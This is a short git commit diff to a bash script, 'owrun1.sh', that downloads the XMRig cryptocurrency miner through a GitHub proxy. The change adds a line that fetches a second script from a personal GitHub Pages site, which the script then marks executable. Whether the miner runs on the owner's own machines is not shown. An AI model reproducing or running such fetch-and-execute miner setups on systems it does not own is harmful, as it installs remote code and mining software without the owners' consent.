eee30ab5e4d01f8e406131f3b15a788115f61672
Poempoat <97211503+Poempoat@users.noreply.github.com>
2023-08-16 14:17:55 +0800

    Update owrun1.sh

--- owrun1.sh
+++ owrun1.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 wget https://ghproxy.com/https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
+wget https://poempoat.github.io/owrun2.sh
 tar xpvf *.gz
 mv xmrig*/* .
 chmod +x ./owrun2.sh
